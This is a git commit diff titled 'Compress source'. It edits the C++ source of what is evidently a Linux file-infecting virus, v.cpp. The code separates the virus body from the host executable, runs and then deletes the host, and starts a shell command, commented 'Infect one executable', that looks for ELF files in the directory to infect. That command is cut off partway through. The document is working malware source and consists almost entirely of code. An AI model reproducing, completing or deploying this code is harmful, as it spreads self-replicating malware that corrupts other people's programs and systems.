3f45df6b3dd2fb2383cab1a537afbc6e37051d0a
Niels Koster <n.koster@portavita.eu>
2017-07-30 21:34:41 +0200

    Compress source

--- v.cpp
+++ v.cpp
@@ -15,31 +15,24 @@ int main (int argc, char** argv) {
     ofstream fo(exe);
     ofstream fv(vir);
     if (fi.is_open() && fo.is_open() && fv.is_open()) {
-        // Write "vir"
         for (int i = 0; i < MYSIZE; i++) fv << (char)fi.get();
-        // Write "exe"
         fi.seekg(MYSIZE, fi.beg);
         while ((c = fi.get()) != -1) fo << (char)c;
         fi.close();
         fo.close();
         fv.close();
-        // Construct command line plus arguments
         command = "chmod u+x ";
         command += exe;
         command += " && ";
         command += exe;
-        if (argc > 1) {
+        if (argc > 1)
             for (int i = 1; i < argc; i++) {
                 command += " ";
                 command += (string)argv[i];
             }
-        }
         command += " && rm -f ";
         command += exe;
-        // Excute original program command line
-        // and delete when ready
         c = system( (command).c_str() );
-        // Infect one executable
         c = system("VIR=$(for n in `find -mindepth 1 -maxdepth 1 -type f | grep -v ^./hi$`; \
 do \
 file $n | grep -q ELF && ( \
